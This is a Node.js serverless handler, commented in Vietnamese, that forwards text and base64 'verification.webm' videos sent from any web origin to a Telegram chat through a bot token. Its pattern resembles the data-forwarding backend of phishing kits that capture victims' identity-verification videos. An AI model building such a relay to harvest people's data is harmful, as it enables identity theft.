module.exports = async function handler(req, res) {
  // Chỉ cho phép POST request
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  // CORS headers để cho phép frontend gọi từ mọi nguồn
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  try {
    const { CHAT_ID, type, data } = req.body;

    // Lấy Bot Token từ Environment Variables (bảo mật)
    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    
    // Kiểm tra bot token và chat ID
    if (!BOT_TOKEN) {
      return res.status(500).json({ error: 'Bot token not configured. Please set TELEGRAM_BOT_TOKEN environment variable.' });
    }
    
    if (!CHAT_ID) {
      return res.status(400).json({ error: 'CHAT_ID is required' });
    }

    // Gửi tin nhắn text
    if (type === 'Text') {
      const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: data,
          parse_mode: 'Markdown'
        })
      });

      const result = await response.json();
      
      if (!result.ok) {
        return res.status(400).json({ error: 'Telegram API error', details: result });
      }

      return res.status(200).json({ success: true, result });
    }

    // Gửi video dạng base64
    if (type === 'Video') {
      try {
        // Chuyển base64 thành buffer
        const videoBuffer = Buffer.from(data, 'base64');
        const boundary = `----WebKitFormBoundary${Date.now()}${Math.random().toString(36)}`;
        
        // Tạo multipart/form-data thủ công
        const formParts = [];
        
        // Chat ID field
        formParts.push(`--${boundary}\r\n`);
        formParts.push(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
        formParts.push(`${CHAT_ID}\r\n`);
        
        // Video file field
        formParts.push(`--${boundary}\r\n`);
        formParts.push(`Content-Disposition: form-data; name="document"; filename="verification.webm"\r\n`);
        formParts.push(`Content-Type: video/webm\r\n\r\n`);
        
        // Combine text parts and video buffer
        const textBuffer = Buffer.from(formParts.join(''));
        const endBoundary = Buffer.from(`\r\n--${boundary}--\r\n`);
        const formBuffer = Buffer.concat([textBuffer, videoBuffer, endBoundary]);

        // Thử gửi dưới dạng document trước (đáng tin cậy hơn)
        const docUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
        const docResponse = await fetch(docUrl, {
          method: 'POST',
          headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': formBuffer.length.toString()
          },
          body: formBuffer
        });

        const docResult = await docResponse.json();
        
        if (docResult.ok) {
          return res.status(200).json({ success: true, result: docResult, method: 'document' });
        }

        // Nếu document thất bại, thử video
        console.log('sendDocument failed, trying sendVideo:', docResult);
        
        // Sửa lại để gửi dưới dạng video
        const videoFormParts = [];
        videoFormParts.push(`--${boundary}\r\n`);
        videoFormParts.push(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
        videoFormParts.push(`${CHAT_ID}\r\n`);
        
        videoFormParts.push(`--${boundary}\r\n`);
        videoFormParts.push(`Content-Disposition: form-data; name="video"; filename="verification.webm"\r\n`);
        videoFormParts.push(`Content-Type: video/webm\r\n\r\n`);
        
        const videoTextBuffer = Buffer.from(videoFormParts.join(''));
        const videoEndBoundary = Buffer.from(`\r\n--${boundary}--\r\n`);
        const videoFormBuffer = Buffer.concat([videoTextBuffer, videoBuffer, videoEndBoundary]);

        const videoUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
        const videoResponse = await fetch(videoUrl, {
          method: 'POST',
          headers: {
            'Content-Type': `multipart/form-data; boundary=${boundary}`,
            'Content-Length': videoFormBuffer.length.toString()
          },
          body: videoFormBuffer
        });

        const videoResult = await videoResponse.json();
        
        if (!videoResult.ok) {
          return res.status(400).json({ 
            error: 'Telegram API error', 
            details: videoResult,
            documentError: docResult
          });
        }

        return res.status(200).json({ success: true, result: videoResult, method: 'video' });
        
      } catch (videoError) {
        console.error('Error sending video:', videoError);
        return res.status(500).json({ 
          error: 'Error processing video', 
          message: videoError.message 
        });
      }
    }

    return res.status(400).json({ error: 'Invalid type. Use "Text" or "Video"' });

  } catch (error) {
    console.error('Error in telegram API:', error);
    return res.status(500).json({ error: 'Internal server error', message: error.message });
  }
}

